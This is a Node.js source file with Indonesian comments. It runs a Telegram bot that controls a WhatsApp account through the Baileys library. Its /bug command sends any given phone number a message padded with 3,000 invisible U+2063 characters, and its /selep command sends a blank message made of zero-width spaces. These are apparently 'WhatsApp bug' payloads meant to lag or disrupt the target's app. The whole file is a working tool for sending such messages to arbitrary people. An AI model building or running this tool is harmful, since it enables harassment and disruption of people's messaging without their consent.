// 1. IMPOR LIBRARY YANG DIBUTUHKAN
const { Telegraf } = require('telegraf');
const {
    makeWASocket,
    useMultiFileAuthState,
    DisconnectReason
} = require('@whiskeysockets/baileys');
const pino = require('pino');
const { BOT_TOKEN } = require('./config');
const readline = require('readline');


// 2. VARIABEL GLOBAL
let Seren = null;
let isWhatsAppConnected = false;


// 3. FUNGSI BACA INPUT DARI TERMINAL
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout,
});
const question = (text) => new Promise((resolve) => rl.question(text, resolve));


// 4. === FUNGSI BUG & SELEP YANG DIMINTA ===
/**
 * Fungsi "bug" contoh: Kirim pesan dengan banyak karakter tersembunyi
 * @param {string} target - Nomor WA target (format: 628xxxx@s.whatsapp.net)
 * @param {string} pesan - Pesan yang mau dikirim bareng bug
 */
const fungsiBugContoh = async (target, pesan) => {
    try {
        // Karakter tersembunyi (U+2063) — banyaknya bisa disesuaikan
        const karakterTersembunyi = '\u2063'.repeat(3000);
        const pesanDenganBug = `${pesan}\n\n${karakterTersembunyi}`;
        
        await Seren.sendMessage(target, { text: pesanDenganBug });
        return { sukses: true, pesan: "Bug berhasil dikirim (contoh)" };
    } catch (error) {
        console.error("Error di fungsiBugContoh:", error);
        return { sukses: false, pesan: "Gagal kirim bug (contoh)" };
    }
};

/**
 * Fungsi "selep" contoh: Kirim pesan yang tampil kosong
 * @param {string} target - Nomor WA target (format: 628xxxx@s.whatsapp.net)
 */
const fungsiSelepContoh = async (target) => {
    try {
        // Pesan kosong yang dibuat dengan karakter spasi tersembunyi
        const pesanSelep = '\u200B'.repeat(5);
        
        await Seren.sendMessage(target, { text: pesanSelep });
        return { sukses: true, pesan: "Pesan selep berhasil dikirim (contoh)" };
    } catch (error) {
        console.error("Error di fungsiSelepContoh:", error);
        return { sukses: false, pesan: "Gagal kirim selep (contoh)" };
    }
};


// 5. FUNGSI KONEKSI WHATSAPP
const startSesi = async () => {
    const { state, saveCreds } = await useMultiFileAuthState('./session');

    const connectionOptions = {
        printQRInTerminal: false,
        pairingCode: true,
        logger: pino({ level: 'silent' }),
        auth: state,
        browser: ['Chrome (Linux)', '100.0', '']
    };

    Seren = makeWASocket(connectionOptions);
    Seren.ev.on('creds.update', saveCreds);

    Seren.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, isNewLogin } = update;

        if (isNewLogin) {
            const nomor = await question("Masukkan nomor WAmu (contoh: 6281234567890): ");
            await Seren.requestPairingCode(nomor);
            const kode = await question("Masukkan kode pairing yang dikirim ke WAmu: ");
            await Seren.submitPairingCode(kode);
        }

        if (connection === 'open') {
            isWhatsAppConnected = true;
            console.log('\n✅ WhatsApp terhubung!');
        }

        if (connection === 'close') {
            const reconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log('\n❌ WhatsApp terputus!', reconnect ? 'Menghubungkan ulang...' : '');
            if (reconnect) startSesi();
            isWhatsAppConnected = false;
        }
    });
};


// 6. SETUP BOT TELEGRAM
const bot = new Telegraf(BOT_TOKEN);


// 7. === PEMANGGIL FUNGSI BUG & SELEP VIA COMMAND TELEGRAM ===
// Command /bug
bot.command('bug', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const nomorTarget = args[1];
    const pesanBug = args.slice(2).join(' ') || "Ini pesan bug (contoh)";

    // Cek format input
    if (!nomorTarget) {
        return ctx.reply('Format salah! Gunakan: /bug <628xxxx> <pesan>\nContoh: /bug 6281234567890 Halo ini bug');
    }

    // Cek apakah WA terhubung
    if (!isWhatsAppConnected) {
        return ctx.reply('❌ WhatsApp belum terhubung! Gunakan /connect dulu.');
    }

    // Format nomor target ke WA ID
    const targetWA = `${nomorTarget.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    // Panggil fungsi bug
    ctx.reply('🔄 Sedang mengirim bug...');
    const hasil = await fungsiBugContoh(targetWA, pesanBug);
    ctx.reply(hasil.pesan);
});

// Command /selep
bot.command('selep', async (ctx) => {
    const args = ctx.message.text.split(' ');
    const nomorTarget = args[1];

    // Cek format input
    if (!nomorTarget) {
        return ctx.reply('Format salah! Gunakan: /selep <628xxxx>\nContoh: /selep 6281234567890');
    }

    // Cek apakah WA terhubung
    if (!isWhatsAppConnected) {
        return ctx.reply('❌ WhatsApp belum terhubung! Gunakan /connect dulu.');
    }

    // Format nomor target ke WA ID
    const targetWA = `${nomorTarget.replace(/[^0-9]/g, '')}@s.whatsapp.net`;

    // Panggil fungsi selep
    ctx.reply('🔄 Sedang mengirim pesan selep...');
    const hasil = await fungsiSelepContoh(targetWA);
    ctx.reply(hasil.pesan);
});

// Command lain
bot.start((ctx) => {
    ctx.reply(`Halo ${ctx.from.first_name}! 👋
Command yang tersedia:
- /connect : Hubungkan ke WhatsApp
- /bug <628xxxx> <pesan> : Kirim bug (contoh)
- /selep <628xxxx> : Kirim pesan selep (contoh)`);
});

bot.command('connect', async (ctx) => {
    if (isWhatsAppConnected) return ctx.reply('✅ WhatsApp sudah terhubung!');
    startSesi();
    ctx.reply('🔄 Hubungkan ke WhatsApp... Cek Termux buat masukkin kode pairing!');
});


// 8. JALANKAN BOT
startSesi();
bot.launch();

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
